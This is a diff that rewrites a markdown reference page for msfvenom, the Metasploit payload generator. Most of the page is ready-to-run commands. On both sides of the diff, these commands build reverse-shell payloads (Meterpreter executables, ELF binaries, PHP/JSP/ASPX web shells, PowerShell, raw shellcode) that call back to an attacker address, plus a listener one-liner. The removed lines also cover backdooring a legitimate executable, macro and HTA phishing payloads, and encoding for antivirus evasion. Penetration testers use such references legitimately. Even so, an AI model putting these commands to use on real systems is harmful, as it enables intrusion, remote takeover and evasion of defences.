@@ -1,233 +1,152 @@
 ---
-title: "msfvenom"
-category: "exploitation"
-tags: ["metasploit", "payload", "shellcode", "reverse-shell", "exploitation", "encoding"]
+title: msfvenom
+category: tool
+subcategory: exploitation
+tags:
+  - metasploit
+  - payload
+  - shellcode
+  - reverse-shell
+  - encoding
+last_updated: 2025-12-27
 ---
 
 # msfvenom
 
+## Table of Contents
+
+- [Overview](#overview)
+- [Quick Start](#quick-start)
+- [Payload Formats](#payload-formats)
+- [Common Encoders](#common-encoders)
+- [Documentation](#documentation)
+
 ## Overview
 
-msfvenom is the payload generation component of the Metasploit Framework, combining the functionality of the legacy msfpayload and msfencode tools. It creates customized payloads for various platforms including Windows, Linux, macOS, Android, and web applications. These payloads can be output in multiple formats such as executables, scripts, shellcode, and more. msfvenom is essential for penetration testers to generate reverse shells, bind shells, and staged/stageless meterpreter sessions.
+msfvenom is the Metasploit Framework payload generator that combines payload creation and encoding. It generates customized payloads for Windows, Linux, macOS, Android, and web applications in various output formats including executables, scripts, and raw shellcode.
 
-## Installation
+**Key Concepts:**
+- **Staged payloads** (`/`): Small loader that downloads full payload (e.g., `windows/meterpreter/reverse_tcp`)
+- **Stageless payloads** (`_`): Complete payload in single package (e.g., `windows/meterpreter_reverse_tcp`)
 
-msfvenom is included with the Metasploit Framework, which is pre-installed on Kali Linux:
+## Quick Start
+
+### Basic Syntax
 
 ```bash
-# Install Metasploit Framework on Debian/Ubuntu
-sudo apt update
-sudo apt install metasploit-framework
-
-# Verify installation
-msfvenom --version
-
-# List all available payloads
-msfvenom -l payloads
-
-# List all available encoders
-msfvenom -l encoders
-
-# List all output formats
-msfvenom -l formats
+msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
 ```
 
-## Basic Usage
+### Windows Payloads
 
 ```bash
-# Basic syntax
-msfvenom -p <payload> [options] -f <format> -o <output_file>
+# 64-bit Meterpreter reverse shell (exe)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o shell.exe
 
-# Common options:
-# -p    Payload to use
-# -f    Output format (exe, elf, raw, python, c, etc.)
-# -o    Output file path
-# -a    Architecture (x86, x64)
-# --platform    Target platform (windows, linux, osx)
-# LHOST    Local host (attacker IP for reverse shells)
-# LPORT    Local port (attacker listening port)
-# -e    Encoder to use
-# -i    Number of encoding iterations
-# -b    Bad characters to avoid
-# -n    NOP sled length
+# 32-bit Meterpreter reverse shell (exe)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o shell.exe
+
+# DLL payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f dll -o shell.dll
+
+# PowerShell payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f psh -o shell.ps1
 ```
 
-## Key Features
+### Linux Payloads
 
-### Multi-Platform Support
-- Windows (32/64-bit executables, DLLs, PowerShell)
-- Linux (ELF binaries, shell scripts)
-- macOS (Mach-O binaries)
-- Android (APK files)
-- Web payloads (PHP, ASP, JSP, WAR)
-- Cross-platform (Python, Java, Ruby)
-
-### Payload Types
-- **Staged Payloads** (`/`): Smaller initial payload that downloads the full payload (e.g., `windows/meterpreter/reverse_tcp`)
-- **Stageless Payloads** (`_`): Complete payload in a single package (e.g., `windows/meterpreter_reverse_tcp`)
-- **Bind Shells**: Target opens a port for attacker to connect
-- **Reverse Shells**: Target connects back to attacker
-
-### Encoding and Evasion
-- Multiple encoders for AV evasion
-- Bad character avoidance
-- Iterative encoding
-- Custom templates
-
-## Common Use Cases
-
-### Windows Reverse Shell (Meterpreter)
 ```bash
-# 32-bit Windows Meterpreter reverse TCP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+# 64-bit ELF reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o shell.elf
 
-# 64-bit Windows Meterpreter reverse TCP
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell64.exe
-
-# Stageless Meterpreter (larger but more reliable)
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell_stageless.exe
-```
-
-### Linux Reverse Shell
-```bash
-# 32-bit Linux reverse shell
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
-
-# 64-bit Linux Meterpreter
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell64.elf
+# 32-bit ELF reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o shell.elf
 ```
 
 ### Web Payloads
+
 ```bash
 # PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shell.php
 
 # JSP reverse shell
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shell.jsp
 
-# WAR file (for Tomcat)
-msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
+# WAR file (Tomcat)
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f war -o shell.war
 
-# ASP reverse shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp
-
-# ASPX reverse shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx
-```
-
-### Script-Based Payloads
-```bash
-# Python reverse shell
-msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
-
-# Bash reverse shell
-msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.sh
-
-# PowerShell reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o shell.ps1
-
-# PowerShell command (base64 encoded)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd -o shell_cmd.txt
+# ASP/ASPX reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f asp -o shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f aspx -o shell.aspx
 ```
 
 ### Shellcode Generation
-```bash
-# C-formatted shellcode
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o shellcode.c
 
-# Python-formatted shellcode
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -o shellcode.py
+```bash
+# C format shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f c
+
+# Python format shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f python
 
 # Raw shellcode
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
-
-# Hex-formatted shellcode
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shellcode.bin
 ```
 
-### Encoded Payloads (AV Evasion)
-```bash
-# Shikata Ga Nai encoder (polymorphic XOR)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
-
-# Avoid null bytes and newlines
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f exe -o clean_shell.exe
-
-# Multiple encoders
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -e x86/countdown -i 2 -f exe -o multi_encoded.exe
-```
-
-### Custom Templates
-```bash
-# Inject payload into existing executable
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/putty.exe -f exe -o backdoored_putty.exe
-
-# Keep original functionality
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/putty.exe -k -f exe -o backdoored_putty.exe
-```
-
-### Other Formats
-```bash
-# DLL payload
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o shell.dll
-
-# MSI installer
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o shell.msi
-
-# HTA (HTML Application)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hta-psh -o shell.hta
-
-# VBA macro
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba -o macro.vba
-```
-
-## Setting Up the Handler
-
-After generating a payload, set up a listener in Metasploit:
+### Encoding and Bad Character Avoidance
 
 ```bash
-msfconsole -q
+# Encode with shikata_ga_nai (5 iterations)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
 
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.100
-set LPORT 4444
-exploit -j
+# Avoid bad characters (auto-selects encoder)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -b '\x00\x0a\x0d' -f exe -o clean.exe
 ```
 
-Or as a one-liner:
+## Payload Formats
+
+| Format | Description | Use Case |
+|--------|-------------|----------|
+| `exe` | Windows executable | Standard Windows payload |
+| `elf` | Linux executable | Standard Linux payload |
+| `dll` | Windows DLL | DLL hijacking |
+| `psh` | PowerShell script | Fileless execution |
+| `asp` / `aspx` | ASP web shell | IIS web servers |
+| `jsp` | Java Server Pages | Java web servers |
+| `war` | Java Web Archive | Tomcat deployment |
+| `raw` | Raw shellcode | Custom loaders |
+| `c` / `python` | Language arrays | Exploit development |
+| `vba` | VBA macro | Office documents |
+| `hta-psh` | HTA application | Phishing attacks |
+
+## Common Encoders
+
+| Encoder | Architecture | Description |
+|---------|--------------|-------------|
+| `x86/shikata_ga_nai` | x86 | Polymorphic XOR encoder |
+| `x64/xor` | x64 | XOR encoder for 64-bit |
+| `x86/countdown` | x86 | Single-byte XOR countdown |
+| `x86/alpha_mixed` | x86 | Alphanumeric shellcode |
+| `cmd/powershell_base64` | - | Base64 PowerShell |
+
+## Documentation
+
+| File | Description |
+|------|-------------|
+| [official_docs.md](official_docs.md) | Metasploit official msfvenom guide |
+
+## Handler Setup
+
 ```bash
-msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+# Start listener in msfconsole
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; exploit"
 ```
 
-## Tips and Best Practices
+## Quick Reference
 
-1. **Match Payload Architecture**: Ensure 32-bit payloads target 32-bit systems and 64-bit for 64-bit systems. 32-bit payloads may work on 64-bit systems but not vice versa.
-
-2. **Avoid Default Ports**: Do not use common ports like 4444 in real engagements. Use ports like 443, 80, or 8080 that may bypass firewall rules.
-
-3. **Use Stageless for Reliability**: Staged payloads are smaller but require a stable connection. Stageless payloads are larger but more reliable for unstable networks.
-
-4. **Test Before Deployment**: Always test payloads in a controlled environment before using them in an engagement.
-
-5. **Modern AV Evasion**: Basic encoding (shikata_ga_nai) is often detected. Consider using custom packers, crypters, or manual obfuscation techniques.
-
-6. **HTTPS Payloads**: Use HTTPS reverse shells (`reverse_https`) to encrypt traffic and blend with normal network activity.
-
-7. **Check Bad Characters**: When exploiting buffer overflows, identify and avoid bad characters using the `-b` flag.
-
-8. **Use x64 When Possible**: 64-bit payloads are generally more stable on modern systems.
-
-9. **Document Payload Hashes**: Keep track of file hashes for your generated payloads for reporting purposes.
-
-10. **Clean Up After Engagement**: Remove all payloads from target systems after testing is complete.
-
-## Related Tools
-
-- **msfconsole** - Main Metasploit Framework interface for exploit execution and session handling
-- **msfpc** - MSFvenom Payload Creator, a wrapper script for quick payload generation
-- **venom** - Advanced payload generation with evasion techniques
-- **unicorn** - PowerShell downgrade attack and shellcode injection tool
-- **shellter** - Dynamic PE infector for AV evasion
-- **veil-framework** - Payload generation framework focused on AV evasion
-- **cobalt-strike** - Commercial adversary simulation tool with beacon payloads
+```bash
+msfvenom -l payloads    # List all payloads
+msfvenom -l encoders    # List all encoders
+msfvenom -l formats     # List output formats
+msfvenom --help-formats # Detailed format help
+```
